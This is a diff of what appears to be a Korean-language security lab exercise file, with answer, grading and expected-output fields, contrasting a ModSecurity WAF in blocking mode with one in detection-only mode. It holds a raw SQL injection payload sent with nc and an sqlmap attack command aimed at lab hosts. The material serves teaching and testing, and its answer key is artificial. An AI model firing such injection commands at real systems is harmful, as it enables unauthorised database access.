-      # 2) 같은 페이로드를 juice(DetectionOnly)에 전송 → juice= 응답코드(차이는 Host=vhost의 ModSec 모드뿐)
-      echo -en "GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
-      # 3) 해석 — dvwa=403(차단), juice=200(DetectionOnly). 같은 SQLi 다른 결과
-      # → dvwa=403(차단), juice=200(DetectionOnly). 같은 SQLi 다른 결과
+      # 1) juice에서 데이터를 덤프한 그 sqlmap을 dvwa(차단 모드)에 똑같이 던진다
+      sqlmap -u "http://dvwa.el34.lab/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=2 --risk=2 --disable-coloring
+      # 2) 해석 — 모든 페이로드가 WAF에 403으로 막혀 'not injectable' + '403 (Forbidden)' 보고
+      # → dvwa=WAF 403 전량 차단, juice=추출 성공(미션2~4). 차이는 ModSec 모드(차단 vs 탐지)뿐
       ```
       ## 🔧 비교 포인트
-      - 두 요청의 페이로드(`1' UNION SELECT 1--`, %27·%20 인코딩)는 완전히 동일하다.
-      - 다른 것은 `Host` 헤더(dvwa vs juice)뿐 — 즉 차이는 vhost 의 ModSec 모드에서만 온다.
+      - juice(DetectionOnly)에서 sqlmap 은 취약 판정·Users 덤프까지 성공했다(미션 2~4).
+      - dvwa(차단 모드)에서는 같은 sqlmap 의 모든 주입 시도가 949110 으로 403 차단 → sqlmap 이
+        `all tested parameters do not appear to be injectable ... protection mechanism (e.g. WAF)` 와
+        `403 (Forbidden) - N times` 를 보고한다. 차이는 취약점이 아니라 vhost 의 ModSec 모드에서 온다.
       ## ✅ 합격 기준
-      `juice=200` 출력 시 통과. **근거:** `dvwa=403 juice=200` 이 나오면 같은 공격이 차단 모드(403)와
-      탐지 전용(200)에서 다른 결과를 냄이 확인된다(차이는 WAF 정책뿐).
-    hint: 'dvwa 403 vs juice 200'
+      `403` 출력 시 통과. **근거:** dvwa 에서 sqlmap 이 WAF/`403 (Forbidden)` 를 보고하면, juice(추출
+      성공)와 대비해 같은 공격이 차단 모드와 탐지 전용에서 다른 결과를 냄이 확인된다(차이는 WAF 정책뿐).
+    hint: 'sqlmap dvwa WAF 403 차단'
     category: analysis
     points: 12
     answer: |
-      # 1) 동일 페이로드(1' UNION SELECT 1--)를 dvwa(차단 모드)에 전송 → dvwa= 응답코드
-      ssh att@192.168.0.202 "echo "dvwa=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')""
-      # 2) 같은 페이로드를 juice(DetectionOnly)에 전송 → juice= 응답코드(차이는 Host=vhost의 ModSec 모드뿐)
-      ssh att@192.168.0.202 "echo "juice=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')""
-      # 3) 해석 — dvwa=403(차단), juice=200(DetectionOnly). 같은 SQLi 다른 결과
-      # → dvwa=403(차단), juice=200(DetectionOnly). 같은 SQLi 다른 결과
-    answer_detail: "같은 SQLi 페이로드를 dvwa/juice 에 보냈을 때의 차이는 취약점이 아니라 WAF 정책에서 온다 — dvwa 는 차단 모드라 949110 발동 시 403, juice 는 DetectionOnly 라 탐지·기록만 하고 200 통과. dvwa=403·juice=200 이 나오면 모드 차이를 확인한 것. 실전에서는 DetectionOnly 로 false-positive 를 튜닝한 뒤 차단 모드로 전환한다."
+      # 1) juice에서 데이터를 덤프한 그 sqlmap을 dvwa(차단 모드)에 똑같이 던진다
+      ssh att@192.168.0.202 'sqlmap -u "http://dvwa.el34.lab/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=2 --risk=2 --disable-coloring'
+      # 2) 해석 — 모든 페이로드가 WAF에 403으로 막혀 'not injectable' + '403 (Forbidden)' 보고
+      # → dvwa=WAF 403 전량 차단, juice=추출 성공(미션2~4). 차이는 ModSec 모드(차단 vs 탐지)뿐
+    answer_detail: "같은 sqlmap 을 juice/dvwa 에 던졌을 때의 차이는 취약점이 아니라 WAF 정책에서 온다. juice 는 DetectionOnly 라 sqlmap 이 취약 판정·Users 덤프까지 성공했지만(미션 2~4), dvwa 는 차단 모드라 모든 주입 시도가 949110 으로 403 차단된다 — sqlmap 은 all tested parameters do not appear to be injectable ... protection mechanism (e.g. WAF) 와 403 (Forbidden) - N times 를 보고한다. 실전에서는 DetectionOnly 로 false-positive 를 튜닝한 뒤 차단 모드로 전환한다. 채점은 stdout 에 '403' 이 보이는지로 판정한다."
     expected_output: |
-      dvwa=403 juice=200
-      → dvwa=403(차단), juice=200(DetectionOnly). 같은 SQLi 다른 결과
+      [CRITICAL] all tested parameters do not appear to be injectable ... if you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' ...
+      [WARNING] HTTP error codes detected during run:
+      403 (Forbidden) - 887 times
+      → dvwa=WAF 403 전량 차단, juice=추출 성공(미션2~4). 차이는 ModSec 모드(차단 vs 탐지)뿐
     verify:
       type: output_contains
-      expect: 'juice=200'
+      expect: '403'
       field: stdout
       semantic:
         intent: "차단 vs 탐지"
-        success_criteria: ["dvwa 403/juice 200"]
-        acceptable_methods: ["**[OSS] dvwa vs juice (권장)**"]
+        success_criteria: ["dvwa WAF 403"]
+        acceptable_methods: ["**[OSS] sqlmap (권장)**"]
     target_vm: web
 
   - order: 7
